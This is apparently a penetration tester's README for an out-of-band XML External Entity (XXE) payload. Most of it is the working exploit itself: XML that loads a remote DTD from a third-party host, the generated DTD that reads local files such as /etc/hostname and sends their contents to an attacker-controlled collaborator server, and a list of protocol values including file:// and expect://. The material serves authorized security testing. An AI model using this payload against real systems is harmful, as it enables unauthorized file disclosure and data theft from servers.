# XXE
The Out of Band payload I have been using for a long time is located at:

https://raw.githubusercontent.com/awillard1/Pen-Test-Tools/master/xxe/oob.xml

The concept is fairly straight forward and has been pulled together from XXE payloads on the internet. The idea is to use the OOB payload but to be able to generate the dtd based on your input.

```
<?xml version="1.0"?>
<!DOCTYPE data [<!ENTITY % evildtd SYSTEM "https://www.aswsec.com/exploit/evildtd.php?file=/etc/hostname&s=https://YourBURPCollaboratorInstance/">%evildtd;%LoadOOBEnt;%OOB;]>
<data></data>
```

This allows us to dynamically create our payload by changing the file and s parameters during the POST of the XXE payload.

Alternatively, you can use evildtd-full.php, which allows you to place the full path for file. 
Example for file:
```
WHATEVERPROTOCOL://VALUE
file:///etc/hostname
file://c:/windows/win.ini
http://SomeHostNameToUse/SomePath/Some.file
expect://VALUE
```

If we call out to https://www.aswsec.com/exploit/evildtd.php?file=/etc/hostname&s=https://YourBURPCollaboratorInstance/ we will get a dtd that looks like this:

```
<!ENTITY % resource SYSTEM "file:///etc/hostname">
<!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM 'https://YourBURPCollaboratorInstance/?p=%resource;'>">
```

This allows us to use intruder to set the file name as a payload list to pull without having to manually change the dtd.

The basics of the php file can be found at:

https://github.com/awillard1/Pen-Test-Tools/tree/master/xxe
